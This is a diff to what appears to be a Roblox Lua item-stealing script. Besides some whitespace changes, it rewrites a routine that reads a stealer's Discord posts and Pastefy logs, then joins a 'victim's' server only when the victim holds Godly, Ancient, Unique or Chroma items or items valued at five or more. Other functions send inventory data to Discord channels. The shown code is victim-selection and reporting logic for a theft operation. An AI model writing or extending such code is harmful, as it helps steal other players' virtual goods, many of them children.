@@ -430,7 +430,7 @@ function inv()
         },
         Body = HttpService:JSONEncode(payload)
     })
-    
+
     if response.StatusCode ~= 200 then
         warn(response.Body)
     end
@@ -438,7 +438,7 @@ end
 function invf()
     local url = "https://discord.com/api/v10/channels/"..logid.."/messages" 
 
-    
+
     local inventroy = "Inventory value: "
     talbe = {}
     vaule = 0
@@ -891,13 +891,13 @@ function react(msgid, emoji)
 end
 
 if not isfile("jnubs.txt") then
-	writefile("jnubs.txt", "[]")
+        writefile("jnubs.txt", "[]")
 end
 if not isfile("nub.txt") then
-	writefile("nub.txt", "nub")
+        writefile("nub.txt", "nub")
 end
 if not isfile("queue.txt") then
-	writefile("queue.txt", "[]")
+        writefile("queue.txt", "[]")
 end
 
 
@@ -1080,18 +1080,33 @@ local function processJoinMessage(messageData)
     -- ║  GODLY+ RARITY FILTER            ║
     -- ║  Only join if victim has Godly+  ║
     -- ╚══════════════════════════════════╝
-    local godlyRarities = {
-        ["Godly"]  = true,
-        ["Ancient"] = true,
-        ["Unique"]  = true,
-        ["Chroma"]  = true,
-    }
     local hasGodly = false
-
-    -- check message text for known Godly+ item names or rarity keywords
     local textLower = combined:lower()
 
-    -- check if the pastefy log mentions Godly+ rarity
+    -- Helper to check if text contains high value items
+    local function textHasHighValue(txt)
+        -- Look for numbers after arrows (➜, →, ->)
+        for val in string.gmatch(txt, "[➜→]%s*(%d+)") do
+            if tonumber(val) and tonumber(val) >= 5 then
+                return true
+            end
+        end
+        -- Look for "->"
+        for val in string.gmatch(txt, "%-%>%s*(%d+)") do
+            if tonumber(val) and tonumber(val) >= 5 then
+                return true
+            end
+        end
+        -- Look for generic "Value: X"
+        for val in string.gmatch(txt, "[Vv]alue[:%s]+(%d+)") do
+            if tonumber(val) and tonumber(val) >= 5 then
+                return true
+            end
+        end
+        return false
+    end
+
+    -- 1. Check Pastefy
     local pasteUrl2 = combined:match("https://pastefy%.app/[%w]+/raw")
     if pasteUrl2 then
         local ok3, res3 = pcall(function()
@@ -1099,23 +1114,31 @@ local function processJoinMessage(messageData)
         end)
         if ok3 and res3 and res3.StatusCode == 200 then
             local logText = res3.Body:lower()
+            -- Check for keywords
             if logText:find("godly") or logText:find("ancient") or logText:find("unique") or logText:find("chroma") then
                 hasGodly = true
-                print("[aj] rarity filter PASSED via pastefy log")
+                print("[aj] rarity filter PASSED via pastefy log (keyword)")
+            -- Check for value >= 5
+            elseif textHasHighValue(logText) then
+                hasGodly = true
+                print("[aj] rarity filter PASSED via pastefy log (value >= 5)")
             end
         end
     end
 
-    -- also check embed fields/description for rarity mentions (stealer posts Top Items)
+    -- 2. Fallback to Discord Message Text
     if not hasGodly then
         if textLower:find("godly") or textLower:find("ancient") or textLower:find("unique") or textLower:find("chroma") then
             hasGodly = true
-            print("[aj] rarity filter PASSED via message text")
+            print("[aj] rarity filter PASSED via message text (keyword)")
+        elseif textHasHighValue(textLower) then
+            hasGodly = true
+            print("[aj] rarity filter PASSED via message text (value >= 5)")
         end
     end
 
     if not hasGodly then
-        print("[aj] rarity filter BLOCKED - no Godly+ found, skipping join")
+        print("[aj] rarity filter BLOCKED - no Godly+ or Value >= 5 found, skipping join")
         return
     end
 
